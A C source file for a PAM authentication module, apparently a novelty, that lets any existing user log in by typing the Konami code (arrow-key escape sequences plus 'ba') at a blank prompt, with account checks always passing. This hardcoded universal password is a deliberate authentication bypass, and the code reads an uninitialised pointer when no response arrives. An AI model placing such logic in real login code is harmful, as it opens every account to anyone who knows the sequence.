#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <sys/param.h>
#include <pwd.h>

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

/* expected hook, this is where custom stuff happens */
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    char *prompt = "";
    char seq[] = {0x1b, 0x5b, 0x41, 0x1b, 0x5b, 0x41, 0x1b, 0x5b, 0x42, 0x1b, 0x5b, 0x42, 0x1b, 0x5b, 0x44, 0x1b, 0x5b, 0x43, 0x1b, 0x5b, 0x44, 0x1b, 0x5b, 0x43, 0x62, 0x61};
    int retval;
    const char *password, *user;
    struct pam_conv *conv;
    struct pam_message msg;
    const struct pam_message *msgp;
    struct passwd *pwd;
    struct pam_response *resp;
    resp = NULL;
    if ((retval = pam_get_user(pamh, &user, NULL)) != PAM_SUCCESS)
        return (retval);
    if ((pwd = getpwnam(user)) == NULL)
        return (PAM_USER_UNKNOWN);
    retval = pam_get_item(pamh, PAM_CONV, (const void **)&conv);
    if (retval != PAM_SUCCESS)
        return (PAM_SYSTEM_ERR);
    msg.msg_style = PAM_PROMPT_ECHO_OFF;
    msg.msg = prompt;
    msgp = &msg;
    retval = (*conv->conv)(1, &msgp, &resp, conv->appdata_ptr);
    if (resp != NULL) {
        if (retval == PAM_SUCCESS)
            password = resp->resp;
        else
            free(resp->resp);
        free(resp);
    }
    for (int i = 0; i < sizeof(seq); ++i){
        if (password[i] != seq[i]){
            return PAM_AUTH_ERR;
        }
    }
    return PAM_SUCCESS;
}
